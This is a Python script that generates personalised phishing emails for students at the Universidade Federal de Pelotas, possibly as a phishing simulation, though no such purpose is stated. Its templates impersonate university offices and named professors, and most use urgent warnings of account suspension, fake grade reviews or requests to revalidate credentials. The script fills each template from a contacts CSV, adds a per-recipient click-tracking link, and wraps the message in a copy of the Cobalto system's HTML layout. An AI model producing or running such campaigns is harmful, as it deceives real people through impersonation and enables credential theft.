import csv
import json
import random
from datetime import datetime
import os

# Dataset de emails de phishing
DATASET_EMAILS = [
  {
    "remetente": "Núcleo de Bolsas CDTec",
    "assunto": "[cobalto] Você foi pré-selecionado para a Bolsa de Incentivo Acadêmico!",
    "corpo": "Olá, {destinatario},\n\nEm reconhecimento ao seu excelente desempenho inicial no curso de Ciência da Computação, temos o prazer de informar que você foi pré-selecionado(a) para a nova **Bolsa de Incentivo Acadêmico do CDTec**.\n\nEsta é uma oportunidade exclusiva para calouros que demonstraram notável aptidão em disciplinas como Sistemas Discretos e Algoritmos.\n\nAs vagas são limitadas e a seleção final requer a confirmação do seu interesse através do preenchimento de um breve formulário. O prazo para inscrição se encerra em 48 horas.\n\nConfirme sua candidatura no link abaixo:\n\n{link}\n\nParabéns pelo seu esforço!\n\nAtenciosamente,\n\nCoordenação de Assuntos Estudantis\nCentro de Desenvolvimento Tecnológico (CDTec)"
  },
  {
    "remetente": "Prof. Weslen Schiavon de Souza",
    "assunto": "[cobalto] Convite: Bate-papo com Engenheiro do Google (Ex-aluno UFPel)",
    "corpo": "Olá, {destinatario},\n\nEspero que esteja aproveitando bem o final do semestre.\n\nEstou organizando um evento especial e exclusivo para a nossa turma de Introdução à Ciência da Computação: um bate-papo online com um ex-aluno nosso que hoje é Engenheiro de Software no Google.\n\nÉ uma oportunidade única para vocês tirarem dúvidas sobre carreira, mercado e tecnologia. Para garantir a organização, as vagas são limitadas e preciso que confirmem a presença.\n\nO evento também contará como horas complementares.\n\nReserve seu lugar no link:\n\n{link}\n\nConto com a sua presença!\n\nAbraço,\n\nProf. Weslen Schiavon de Souza\nCiência da Computação - UFPel"
  },
  {
    "remetente": "Secretaria de Registros Acadêmicos - CDTec",
    "assunto": "[cobalto] Aviso Obrigatório: Confirmação de Plano de Estudos 2025/2",
    "corpo": "Prezado(a) {destinatario},\n\nEm conformidade com a nova Normativa de Aproveitamento Acadêmico (Portaria CDTec 112/2025), todos os discentes do curso de Ciência da Computação devem realizar a validação do plano de estudos para o semestre 2025/2.\n\nEste procedimento é obrigatório para garantir a correta alocação nas disciplinas do próximo período e evitar inconsistências em sua matrícula.\n\nO prazo final para a validação é **22 de Agosto**, coincidindo com o prazo para trancamento geral.\n\nA não confirmação implicará em **pendência na matrícula** para o próximo semestre, que se inicia em 15 de Setembro.\n\nAcesse o portal de validação abaixo:\n\n{link}\n\nAtenciosamente,\n\nSecretaria de Registros Acadêmicos\nCentro de Desenvolvimento Tecnológico (CDTec) - UFPel"
  },
  {
    "remetente": "Prof. Guilherme T. Netto",
    "assunto": "[cobalto] Revisão de Notas - Trabalho Final de Algoritmos e Programação",
    "corpo": "Olá, {destinatario},\n\nEstou finalizando o lançamento das notas da disciplina de Algoritmos e Programação. Durante a correção, identifiquei a necessidade de reavaliar um dos critérios do trabalho final, o que resultou no ajuste de algumas notas.\n\nAntes de submeter os resultados finais ao sistema Cobalto, peço que você confira e confirme sua nota revisada através do portal de notas da disciplina.\n\nO prazo para esta confirmação é de 24 horas. Após este período, as notas serão enviadas ao sistema e não poderão ser alteradas.\n\nPor favor, acesse o portal para verificar:\n\n{link}\n\nQualquer dúvida, me responda neste e-mail.\n\nAtenciosamente,\n\nProf. Guilherme Tomaschewski Netto\nColegiado de Ciência da Computação - UFPel"
  },
  {
    "remetente": "Suporte Técnico CDTec",
    "assunto": "[cobalto] AÇÃO NECESSÁRIA: Alerta de Segurança Crítico na sua Conta UFPel",
    "corpo": "Olá, {destinatario},\n\nDetectamos uma inconsistência crítica em sua conta de aluno no sistema Cobalto da UFPel. Esta atividade levantou alertas em nossos protocolos de segurança.\n\nPara proteger seus dados e garantir a integridade do sistema, sua conta será **suspensa preventivamente dentro das próximas 24 horas** caso nenhuma ação seja tomada.\n\nPara evitar a suspensão e reativar o acesso completo aos seus dados acadêmicos, incluindo notas e matrículas, é fundamental que você verifique suas credenciais imediatamente. Por favor, clique no link abaixo para validar sua identidade:\n\n{link}\n\nA não regularização resultará na perda temporária de acesso a todos os serviços da UFPel.\n\nAtenciosamente,\n\nEquipe de Suporte Técnico de Informática\nCentro de Desenvolvimento Tecnológico (CDTec)\nUniversidade Federal de Pelotas (UFPel)"
  },
  {
    "remetente": "Suporte Acadêmico",
    "assunto": "[cobalto] URGENTE: Instabilidade no registro de notas do semestre 2025/1",
    "corpo": "Olá, {destinatario},\n\nInformamos que foi identificada uma instabilidade em sua conta do sistema acadêmico Cobalto, o que pode afetar o registro de suas notas e a sua situação de matrícula para o próximo semestre.\n\nPara garantir que suas notas do semestre 2025/1 sejam processadas corretamente antes do período de exames, solicitamos que você valide seus dados **imediatamente**.\n\nPor favor, clique no link seguro abaixo e siga as instruções para reativar e verificar sua conta:\n\n{link}\n\nA falha em completar esta verificação **dentro de 12 horas** resultará no bloqueio temporário de sua conta, podendo impactar sua participação nos exames.\n\nAtenciosamente,\n\nEquipe de Suporte Acadêmico\nCentro de Desenvolvimento Tecnológico (CDTec)\nUniversidade Federal de Pelotas (UFPel)"
  },
  {
    "remetente": "Prof. Larissa Astrogildo de Freitas",
    "assunto": "[cobalto] Convite para Participação em Pesquisa Remunerada - Lógica para Computação",
    "corpo": "Olá, {destinatario},\n\nEscrevo para você em particular, pois observei seu bom desempenho e interesse na disciplina de Lógica para Computação neste semestre.\n\nEstou iniciando um novo projeto de pesquisa na área de verificação formal de software e gostaria de convidá-lo(a) para participar. O projeto inclui uma bolsa de iniciação científica remunerada e há possibilidade de publicação de artigos.\n\nSelecionei alguns alunos com perfil promissor e as vagas são limitadas. Se tiver interesse, peço que preencha o formulário de aplicação o mais breve possível.\n\nSaiba mais e inscreva-se no link:\n\n{link}\n\nAtenciosamente,\n\nProf. Larissa Astrogildo de Freitas\nCentro de Desenvolvimento Tecnológico (CDTec) - UFPel"
  },
  {
    "remetente": "Central de Estágios - CDTec/UFPel",
    "assunto": "[cobalto] Oportunidade de Estágio em Desenvolvimento de Software | Parceria CC/UFPel",
    "corpo": "Olá, {destinatario},\n\nEm parceria com a coordenação do curso de Ciência da Computação, temos o prazer de anunciar uma vaga de estágio exclusiva para alunos da UFPel na empresa de tecnologia TechSul.\n\nA vaga é para a área de Desenvolvimento de Software, com foco em tecnologias de nuvem e inteligência artificial.\n\nEste é um processo seletivo relâmpago com o objetivo de preencher a vaga rapidamente. As inscrições se encerram na próxima segunda-feira, 18 de Agosto.\n\nNão perca esta excelente oportunidade de iniciar sua carreira!\n\nCandidate-se e veja mais detalhes no link:\n\n{link}\n\nAtenciosamente,\n\nCentral de Estágios\nCDTec - UFPel"
  },
  {
    "remetente": "Núcleo de Segurança da Informação (NSI) - UFPel",
    "assunto": "[cobalto] AÇÃO OBRIGATÓRIA: Atualização de segurança para acesso ao Cobalto/Moodle",
    "corpo": "Prezado(a) {destinatario},\n\nDevido a um recente incidente de segurança em nossos sistemas, o Núcleo de Segurança da Informação (NSI) da UFPel implementou um novo protocolo de autenticação para todos os usuários.\n\nPara garantir seu acesso ininterrupto ao Cobalto e ao Moodle durante o período de exames (25-30 de Agosto), é **obrigatório** que você revalide suas credenciais através do novo portal unificado de segurança.\n\nA falha em completar este procedimento até o dia 20 de Agosto resultará no bloqueio preventivo do seu acesso.\n\nAtualize sua conta agora pelo link:\n\n{link}\n\nAgradecemos a sua colaboração para manter nossa comunidade segura.\n\nAtenciosamente,\n\nNSI - UFPel"
  },
  {
    "remetente": "Centro Acadêmico da Computação (CACOMP)",
    "assunto": "[cobalto] Confira os resultados da Avaliação do Semestre 2025/1!",
    "corpo": "E aí, {destinatario}?\n\nSobreviveu ao primeiro semestre? Esperamos que sim!\n\nAgradecemos a todos que participaram da nossa tradicional pesquisa de avaliação das disciplinas e professores. A opinião de vocês é fundamental para buscarmos melhorias no curso.\n\nCompilamos todos os dados e agora você pode conferir o relatório completo (e anônimo, claro!) com o ranking das matérias, os professores mais bem avaliados, os principais pontos positivos e as críticas da galera.\n\nSerá que sua opinião bateu com a da maioria?\n\nDescubra no link:\n\n{link}\n\nQualquer ideia ou sugestão, é só chamar!\n\nAtenciosamente,\n\nGestão CACOMP 2025\nCiência da Computação - UFPel"
  },
  {
  "remetente": "Prof. Guilherme Tomaschewski Netto",
  "assunto": "[cobalto] Urgente: Revisão de Notas",
  "corpo": "Olá, {destinatario},\n\nEscrevo com urgência sobre sua situação na disciplina de Algoritmos e Programação (22000294).\n\nAo finalizar o lançamento das notas para o sistema Cobalto, identifiquei uma inconsistência nos seus envios de trabalhos. A sua frequência está em 76%, muito próxima do limite, e a média atual está em 6,8, o que te levaria para o exame final.\n\nO prazo final para digitação das notas é 02 de Setembro, e preciso resolver isso hoje para não te prejudicar. É possível que tenha ocorrido um erro no sistema de upload.\n\nPor favor, acesse o portal de revisão de notas através do link abaixo para verificar os envios que estão pendentes e confirmar sua nota semestral. Você tem até o final do dia para fazer a validação.\n\nLink para revisão: {link}\n\nA falta de ação resultará na manutenção da nota atual e na necessidade de realizar o exame.\n\nAtenciosamente,\n\nProf. Guilherme Tomaschewski Netto\nDisciplina de Algoritmos e Programação\nCentro de Desenvolvimento Tecnológico (CDTec)\nUniversidade Federal de Pelotas"
}
]


def get_cobalto_html_body(plain_text):
    """Gera o template HTML do sistema Cobalto com o texto fornecido"""
    plain_text_html = plain_text.replace('\n', '<br>')
    return f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>UFPel - Sistema Cobalto</title>
</head>
<body style="margin:0; padding:0; font-family: Helvetica, Arial, sans-serif; background-color: #6B91C6;">
<table width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color:#6B91C6;">
    <tr>
        <td>
            <table width="100%" cellspacing="0" cellpadding="0" border="0">
                <tr>
                    <td>
                        <img src="http://api-cobalto.ufpel.edu.br/images/troca_de_mensagens_logo_175.png" alt="Troca de Mensagens" style="margin:40px 10px 30px 30px; display:block; border:none;">
                    </td>
                    <td align="right">
                        <img src="http://api-cobalto.ufpel.edu.br/images/assinatura_193.png" alt="UFPel" style="margin:15px 30px 10px 25px; display:block; border:none;">
                    </td>
                </tr>
            </table>
        </td>
    </tr>
    <tr>
        <td style="padding:0 20px;">
            <table width="100%" cellspacing="0" cellpadding="0" border="0" align="center" style="background-color:#ffffff; font-size:16px; color:#333;">
                <tr>
                    <td valign="top" style="padding:20px 40px;">
                        <p style="text-align: justify;">
                            {plain_text_html}
                        </p>
                    </td>
                </tr>
            </table>
        </td>
    </tr>
    <tr>
        <td>
            <table width="100%" cellspacing="0" cellpadding="0" border="0">
                <tr>
                    <td valign="top" style="padding:20px;">
                        <table cellspacing="0" cellpadding="0" border="0">
                            <tr>
                                <td>
                                    <img src="http://api-cobalto.ufpel.edu.br/images/troca_de_mensagens_125.png" alt="Troca de Mensagens" style="display:block; border:none; margin-right:10px;">
                                </td>
                                <td>
                                    <img src="http://api-cobalto.ufpel.edu.br/images/logo_125.png" alt="Cobalto" style="display:block; border:none;">
                                </td>
                            </tr>
                        </table>
                        <div style="font-size:11px; color:#fff; margin-top:10px; font-family: Helvetica, Arial, sans-serif;">
                            Cobalto - Integrated Management System<br>
                            ©2010 - 2025 Federal University of Pelotas.
                        </div>
                    </td>
                    <td valign="bottom" align="right" style="padding:20px; font-size:11px; color:#fff; font-family: Helvetica, Arial, sans-serif;">
                        <b>FEDERAL UNIVERSITY OF PELOTAS</b><br>
                        Porto / Anglo Campus<br>
                        Gomes Carneiro Street, 01 - 96010-610<br>
                        Downtown - Pelotas/RS - Brazil<br>
                        <a href="http://portal.ufpel.edu.br" style="color:#2059C9; text-decoration:underline;">http://portal.ufpel.edu.br</a>
                    </td>
                </tr>
            </table>
        </td>
    </tr>
</table>
</body>
</html>"""


def gerar_emails_phishing():
    contatos_arquivo = "../contatos.csv"
    
    try:
        with open(contatos_arquivo, newline='', encoding="utf-8") as f:
            reader = csv.DictReader(f)
            emails_gerados = []
            
            for contato in reader:
                nome = contato.get("nome", "").strip()
                email = contato.get("email", "").strip()
                
                if not nome or not email:
                    continue
                
                email_template = random.choice(DATASET_EMAILS)
                rastreador = f"https://fluffy-gumdrop-ab8e4c.netlify.app/click?id={email}"

                corpo_personalizado = email_template["corpo"].replace("{destinatario}", nome)
                corpo_personalizado = corpo_personalizado.replace(
                    "{link}",
                    f'<a href="{rastreador}" target="_blank">Clique aqui</a>'
                )        
                        
                corpo_html = get_cobalto_html_body(corpo_personalizado)
                
                email_json = {
                    "remetente": email_template["remetente"],
                    "assunto": email_template["assunto"],
                    "destinatario": nome,
                    "email_destinatario": email,
                    "corpo_texto": corpo_personalizado,
                    "corpo_html": corpo_html,
                    "timestamp": datetime.now().isoformat()
                }
                
                emails_gerados.append(email_json)
                
                pasta_emails = "emails_phishing"
                os.makedirs(pasta_emails, exist_ok=True)

                nome_arquivo = os.path.join(
                    pasta_emails,
                    f"email_phishing_{nome.replace(' ', '_').lower()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                )
                with open(nome_arquivo, 'w', encoding='utf-8') as arquivo_json:
                    json.dump(email_json, arquivo_json, ensure_ascii=False, indent=2)
                print(f"Email gerado para {nome} ({email}) - Arquivo: {nome_arquivo}")
            
            arquivo_completo = f"todos_emails_phishing_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(arquivo_completo, 'w', encoding='utf-8') as arquivo_json:
                json.dump(emails_gerados, arquivo_json, ensure_ascii=False, indent=2)
            
            print(f"\nTotal de emails gerados: {len(emails_gerados)}")
            print(f"Arquivo completo salvo: {arquivo_completo}")
            
            return emails_gerados
            
    except FileNotFoundError:
        print(f"Erro: Arquivo {contatos_arquivo} não encontrado!")
        return []
    except Exception as e:
        print(f"Erro ao processar: {e}")
        return []


if __name__ == "__main__":
    gerar_emails_phishing()